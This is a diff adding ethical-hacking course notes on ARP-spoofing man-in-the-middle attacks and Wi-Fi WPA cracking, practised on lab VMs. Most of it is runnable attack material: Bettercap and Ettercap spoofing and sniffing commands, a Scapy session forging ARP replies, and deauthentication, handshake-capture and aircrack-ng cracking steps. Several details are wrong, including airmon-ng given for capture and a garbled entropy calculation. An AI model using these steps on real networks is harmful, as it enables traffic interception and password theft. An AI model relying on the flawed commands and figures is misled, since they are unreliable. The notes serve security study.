@@ -963,3 +963,141 @@ python -m http.server 8001
 - section not followed; however you can find this example code provided by the teacher of ZTM udemy classes in python project folder
 
 # Section 15 : Man in the middle
+- ARP packet
+  - request (ask mac address of X.X.X.X ip)
+  - reply (mac for X.X.X.X id ..:..:..:..)
+- man-in-the-middle : must answer before routeur or send response to routeur (I am ip X.X.X.X) (-> action arp-spoofing)
+
+## Bettercap arp-spoofing
+- run as root
+- install
+```
+┌──(root㉿kali)-[/home/kali]
+└─# apt-get install bettercap
+┌──(root㉿kali)-[/home/kali]
+└─# bettercap
+bettercap v2.32.0 (built for linux amd64 with go1.19) [type 'help' for a list of commands]
+
+192.168.1.0/24 > <kali ip>  » [09:19:11] [sys.log] [inf] gateway monitor started ...
+192.168.1.0/24 > <kali ip>  » help # list bettercap module
+192.168.1.0/24 > <kali ip>  » help <module>
+192.168.1.0/24 > <kali ip>  » <module> on # launch module
+192.168.1.0/24 > <kali ip>  » help arp.spoof
+192.168.1.0/24 > <kali ip>  » set arp.spoof.fullduplex true
+192.168.1.0/24 > <kali ip>  » set arp.spoof.targets <metasploitable ip>
+192.168.1.0/24 > <kali ip>  » help net.sniff
+192.168.1.0/24 > <kali ip>  » set net.sniff.local true
+192.168.1.0/24 > <kali ip>  » arp.spoof on
+
+```
+
+- create script sniff.cap :
+```
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets <metasploitable ip>
+set net.sniff.local true
+arp.spoof on
+net.sniff on
+```
+
+- run it : `bettercap -iface eth0 -caplet sniff.cap`
+
+## Ettercap psw sniffing
+- already installed on kali, use graphic interface
+- enable packet forwarding to not block target
+```
+┌──(root㉿kali)-[/home/kali]
+└─# cat /proc/sys/net/ipv4/ip_forward
+0                              
+┌──(root㉿kali)-[/home/kali]
+└─# echo 1 > /proc/sys/net/ipv4/ip_forward
+┌──(root㉿kali)-[/home/kali]
+└─# cat /proc/sys/net/ipv4/ip_forward     
+1
+```
+- scan for host, click on loop button, see list : click list button
+- start arp poisoning, click world button + start poisoning
+- print less data than bettercap
+- detect arp-spoof detection : exec on spoofed vm `arp -a`, if multiple ip have the same mac address, then an arp-spoof attack is in progress
+
+## Manual arp cache poisoning with Scapy lib
+- native on kali, open it in terminal `scapy`
+```
+┌──(root㉿kali)-[/home/kali]
+└─$ scapy 
+>>> ls(ARP)
+>>> ls(TCP)
+# get win10 test vm
+>>> ls(Ether)
+>>> broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
+>>> broadcast.show()
+arp_layer = ARP(pdst='<win10 vm ip>')
+arp_layer.show()
+entire_packet = broadcast/arp_layer
+entire_packet.show()
+answer = srp(entire_packet, timeout=2, verbose=True)[0]
+print(answer)
+print(answer[0])
+print(answer[0][1].hwsrc) #hwsrc = mac of target (win10 wm)
+target_mac_address = answer[0][1].hwsrc
+malicious_arp_packet = ARP(op=2, hwdst=target_mac_address, pdst='<win10 vm ip>', psrc='<routeur ip>')
+# pdst : dest of malicious_arp_packet
+# psrc : fake src of malicious_arp_packet (routeur ip)
+malicious_arp_packet.show()
+# before sending malicious_arp_packet, run on win10 machine arp -a to check current state of arp table
+send(malicious_arp_packet, verbose=False)
+# rerun arp -a on win10 vm : routeur now has the same mac than kali vm!!
+```
+
+# Wireless Cracking theory
+## prerequisite
+- wireless card with monitor mode + set it in monitor mode
+- be near a wifi access point
+- need to get channel number
+- understand 4-way hanshake protocol
+## steps
+1/ de-authentication package
+2/ all host try to reconnect back
+3/ intercept 4-way-handshake packet to get hashed psw
+4/ crack psw (can be done offline) with aircrack (cpu or gpu) or hashcat (both cpu & gpu)
+
+- get current wireless card mode : iwconfig
+- set it to monitor mode : ifconfig wlo1 down ; iwconfig wlo1 mode monitor/managed ; ifconfig wlo1 up
+- sometimes, no internet acces on monitor mode
+
+### steps 1+2+3
+```
+NAME
+       airmon-ng - POSIX sh script designed to turn wireless cards into monitor mode.
+```
+- list and kill process that uses wifi : airmon-ng check kill
+- start sniffing : airmon-ng check wlo1
+- start sniffing : `airmon-ng -c <channel number, example=6> --bssid <mac address of target accesspoint> -w <output_file> wlo1`
+- disconnect everyone from accesspoint (send disconnect package in infinite loop until ctrl-c) : `aireplay-ng -0 0 -a <mac address of acces point>` wlo1
+- stop sniffing as handshake packet have been exchanged, packet are stored in .cap file
+
+psw entropy = 18^62 = 6.7.10^77
+- 26 upercase letter
+- 26 lowercase letter
+- 10 digits
+- 18 char
+
+
+### step 4
+- list of most common password in France : https://github.com/tarraschk/richelieu
+#### Aircrack
+- find psw DB : `locate rockyou.txt`
+```
+┌──(kali㉿kali)-[~]
+└─$ ls -alh /usr/share/wordlists/rockyou.txt.gz
+-rw-r--r-- 1 root root 51M May 31 10:31 /usr/share/wordlists/rockyou.txt.gz
+```
+- unzip
+```
+aircrack-ng -w rockyou.txt <output_file>.cap
+```
+
+
+
+#### Hashcat
